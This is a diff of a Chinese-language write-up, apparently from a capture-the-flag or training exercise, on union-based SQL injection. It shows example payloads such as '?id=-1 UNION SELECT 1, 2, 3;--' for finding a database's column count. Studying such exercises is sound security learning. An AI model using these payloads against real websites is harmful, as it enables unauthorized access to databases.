@@ -4,7 +4,7 @@
 
 **sqli union**
 給了一個網址，點開來
-![[W1-22_web.png|center|434]]
+![[W1-23_web.png|center|434]]
 點 `Source Code`，簡化：
 ```php
 <?php
@@ -39,9 +39,9 @@
    沒有限制 id 的輸入內容 -> 可以在網址後面加上 `?id=... UNION` 
 3. 取得 DB 的欄位數，輸入
    ```SQL
-   ?id = -1 UNION SELECT 1;--
-   ?id = -1 UNION SELECT 1, 2;--
-   ?id = -1 UNION SELECT 1, 2, 3;--
+   ?id=-1 UNION SELECT 1;--
+   ?id=-1 UNION SELECT 1, 2;--
+   ?id=-1 UNION SELECT 1, 2, 3;--
     ...
    ```
     -> 發現直到 `SELECT 1, 2, 3` 才沒有報 syntax error 
